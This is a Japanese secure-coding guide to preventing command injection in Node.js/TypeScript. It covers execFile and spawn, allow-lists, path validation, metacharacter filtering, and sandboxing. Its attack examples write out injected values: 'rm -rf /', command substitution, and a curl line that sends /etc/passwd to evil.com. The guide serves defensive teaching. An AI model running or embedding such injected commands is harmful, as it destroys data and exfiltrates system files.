# コマンドインジェクション対策

## 概要

コマンドインジェクション攻撃を防止するためのガイドです。
シェルコマンドの安全な実行方法と入力検証を解説します。

## コマンドインジェクションの仕組み

### 攻撃の例

```typescript
import { exec } from "child_process";

// ❌ 脆弱なコード
const filename = "report.txt; rm -rf /";
exec(`cat ${filename}`, (error, stdout) => {
  console.log(stdout);
});
// 実行されるコマンド: cat report.txt; rm -rf /
// → ファイルシステムが削除される

// 他の攻撃パターン
const input = "$(whoami)"; // コマンド置換
const input2 = "`id`"; // バッククォート置換
const input3 = "file.txt && curl http://evil.com/steal?data=$(cat /etc/passwd)";
```

## 安全なコマンド実行

### execFile を使用（推奨）

```typescript
import { execFile } from "child_process";
import { promisify } from "util";

const execFileAsync = promisify(execFile);

// ✅ 安全: execFileは引数を自動的にエスケープ
async function readFile(filename: string): Promise<string> {
  const { stdout } = await execFileAsync("cat", [filename]);
  return stdout;
}

// ✅ 安全: 複数引数
async function listDirectory(path: string): Promise<string> {
  const { stdout } = await execFileAsync("ls", ["-la", path]);
  return stdout;
}

// ✅ 安全: オプション付き
async function runCommand(command: string, args: string[]): Promise<string> {
  const { stdout } = await execFileAsync(command, args, {
    timeout: 5000, // タイムアウト設定
    maxBuffer: 1024 * 1024, // バッファサイズ制限
    env: { ...process.env, PATH: "/usr/bin" }, // 環境変数制限
  });
  return stdout;
}
```

### spawn を使用

```typescript
import { spawn } from "child_process";

// ✅ 安全: spawnも引数を分離
function runProcess(command: string, args: string[]): Promise<string> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      shell: false, // シェルを使用しない
    });

    let stdout = "";
    let stderr = "";

    child.stdout.on("data", (data) => {
      stdout += data;
    });

    child.stderr.on("data", (data) => {
      stderr += data;
    });

    child.on("close", (code) => {
      if (code === 0) {
        resolve(stdout);
      } else {
        reject(new Error(`Process exited with code ${code}: ${stderr}`));
      }
    });

    child.on("error", reject);
  });
}
```

### exec を避けるべき理由

```typescript
import { exec, execFile } from "child_process";

const userInput = "test; rm -rf /";

// ❌ 危険: execはシェルを経由
exec(`echo ${userInput}`, (error, stdout) => {
  // 「rm -rf /」が実行される
});

// ✅ 安全: execFileはシェルを経由しない
execFile("echo", [userInput], (error, stdout) => {
  // 「test; rm -rf /」がそのまま引数として渡される
  console.log(stdout); // "test; rm -rf /\n"
});
```

## 入力検証

### 許可リストアプローチ

```typescript
// ✅ コマンドの許可リスト
const ALLOWED_COMMANDS = ["ls", "cat", "head", "tail", "wc"] as const;
type AllowedCommand = (typeof ALLOWED_COMMANDS)[number];

function isAllowedCommand(cmd: string): cmd is AllowedCommand {
  return ALLOWED_COMMANDS.includes(cmd as AllowedCommand);
}

async function executeCommand(cmd: string, args: string[]): Promise<string> {
  if (!isAllowedCommand(cmd)) {
    throw new Error(`Command not allowed: ${cmd}`);
  }

  const { stdout } = await execFileAsync(cmd, args);
  return stdout;
}

// ✅ 引数の検証
const ALLOWED_OPTIONS = ["-l", "-a", "-h", "-r"] as const;

function validateArguments(args: string[]): void {
  for (const arg of args) {
    if (
      arg.startsWith("-") &&
      !ALLOWED_OPTIONS.includes(arg as (typeof ALLOWED_OPTIONS)[number])
    ) {
      throw new Error(`Option not allowed: ${arg}`);
    }
  }
}
```

### ファイルパスの検証

```typescript
import path from "path";
import fs from "fs";

// ✅ パストラバーサル防止
function sanitizePath(userPath: string, baseDir: string): string {
  // 正規化してベースディレクトリ内かチェック
  const normalizedBase = path.resolve(baseDir);
  const normalizedPath = path.resolve(baseDir, userPath);

  if (!normalizedPath.startsWith(normalizedBase + path.sep)) {
    throw new Error("Path traversal attempt detected");
  }

  return normalizedPath;
}

// 使用例
async function readUserFile(filename: string): Promise<string> {
  const baseDir = "/app/user-files";
  const safePath = sanitizePath(filename, baseDir);

  // シンボリックリンクも確認
  const realPath = await fs.promises.realpath(safePath);
  if (!realPath.startsWith(path.resolve(baseDir))) {
    throw new Error("Symlink traversal attempt detected");
  }

  return fs.promises.readFile(safePath, "utf-8");
}
```

### 危険な文字のフィルタリング

```typescript
// ✅ シェルメタ文字のチェック
const SHELL_METACHARACTERS = /[;&|`$(){}[\]<>!\\*?#~]/;

function containsShellMetachars(input: string): boolean {
  return SHELL_METACHARACTERS.test(input);
}

function validateInput(input: string): void {
  if (containsShellMetachars(input)) {
    throw new Error("Input contains invalid characters");
  }
}

// ✅ より厳格な許可パターン
function isValidFilename(filename: string): boolean {
  // 英数字、アンダースコア、ハイフン、ドットのみ許可
  const VALID_FILENAME = /^[a-zA-Z0-9_\-\.]+$/;
  return VALID_FILENAME.test(filename) && !filename.includes("..");
}
```

## 代替アプローチ

### Node.js組み込みAPIを使用

```typescript
import fs from "fs/promises";
import path from "path";

// ❌ コマンド実行
async function getDirectoryListing(dir: string): Promise<string> {
  const { stdout } = await execFileAsync("ls", ["-la", dir]);
  return stdout;
}

// ✅ Node.js APIを使用
async function getDirectoryListing(dir: string): Promise<string[]> {
  const entries = await fs.readdir(dir, { withFileTypes: true });
  return entries.map((e) => `${e.isDirectory() ? "d" : "-"} ${e.name}`);
}

// ❌ コマンド実行
async function getFileSize(filepath: string): Promise<number> {
  const { stdout } = await execFileAsync("stat", ["-c", "%s", filepath]);
  return parseInt(stdout, 10);
}

// ✅ Node.js APIを使用
async function getFileSize(filepath: string): Promise<number> {
  const stats = await fs.stat(filepath);
  return stats.size;
}
```

### 専用ライブラリを使用

```typescript
// ファイル操作には専用ライブラリを使用
import archiver from "archiver";
import unzipper from "unzipper";

// ❌ コマンドでzip作成
async function createZip(files: string[], output: string): Promise<void> {
  await execFileAsync("zip", [output, ...files]);
}

// ✅ archiverライブラリを使用
async function createZip(files: string[], output: string): Promise<void> {
  const archive = archiver("zip");
  const stream = fs.createWriteStream(output);

  return new Promise((resolve, reject) => {
    archive.pipe(stream);

    for (const file of files) {
      archive.file(file, { name: path.basename(file) });
    }

    stream.on("close", resolve);
    archive.on("error", reject);
    archive.finalize();
  });
}
```

## サンドボックス実行

### Docker を使用した隔離

```typescript
import { execFile } from "child_process";
import { promisify } from "util";

const execFileAsync = promisify(execFile);

// ✅ Dockerコンテナ内で実行
async function runInSandbox(
  command: string,
  args: string[],
  input?: string,
): Promise<string> {
  const dockerArgs = [
    "run",
    "--rm", // 実行後にコンテナを削除
    "--network",
    "none", // ネットワークを無効化
    "--memory",
    "256m", // メモリ制限
    "--cpus",
    "0.5", // CPU制限
    "--read-only", // 読み取り専用ファイルシステム
    "--security-opt",
    "no-new-privileges",
    "sandbox-image",
    command,
    ...args,
  ];

  const options = input ? { input } : {};
  const { stdout } = await execFileAsync("docker", dockerArgs, options);
  return stdout;
}
```

### vm2 を使用（JavaScript実行）

```typescript
import { VM } from "vm2";

// ✅ サンドボックス内でJavaScript実行
function runJavaScriptSafely(
  code: string,
  context: Record<string, unknown> = {},
): unknown {
  const vm = new VM({
    timeout: 1000, // タイムアウト
    sandbox: context, // 利用可能な変数を制限
    eval: false, // evalを無効化
    wasm: false, // WebAssemblyを無効化
  });

  return vm.run(code);
}
```

## ロギングと監視

```typescript
import { execFile } from "child_process";

// ✅ コマンド実行のログ記録
async function executeWithLogging(
  command: string,
  args: string[],
  userId: string,
): Promise<string> {
  const startTime = Date.now();

  console.log(
    JSON.stringify({
      type: "command_execution",
      command,
      args,
      userId,
      timestamp: new Date().toISOString(),
    }),
  );

  try {
    const { stdout } = await execFileAsync(command, args);

    console.log(
      JSON.stringify({
        type: "command_success",
        command,
        userId,
        duration: Date.now() - startTime,
      }),
    );

    return stdout;
  } catch (error) {
    console.error(
      JSON.stringify({
        type: "command_failure",
        command,
        userId,
        error: error instanceof Error ? error.message : "Unknown error",
        duration: Date.now() - startTime,
      }),
    );

    throw error;
  }
}
```

## チェックリスト

### 実装時

- [ ] `exec`の代わりに`execFile`または`spawn`を使用しているか？
- [ ] `shell: true`オプションを避けているか？
- [ ] コマンドと引数を許可リストで検証しているか？
- [ ] タイムアウトとリソース制限を設定しているか？

### 入力検証

- [ ] ファイルパスのトラバーサルをチェックしているか？
- [ ] シェルメタ文字をフィルタリングしているか？
- [ ] 入力長を制限しているか？

### 代替手段

- [ ] Node.js組み込みAPIで代替できないか検討したか？
- [ ] 専用ライブラリで代替できないか検討したか？

## 変更履歴

| バージョン | 日付       | 変更内容     |
| ---------- | ---------- | ------------ |
| 1.0.0      | 2025-11-25 | 初版リリース |
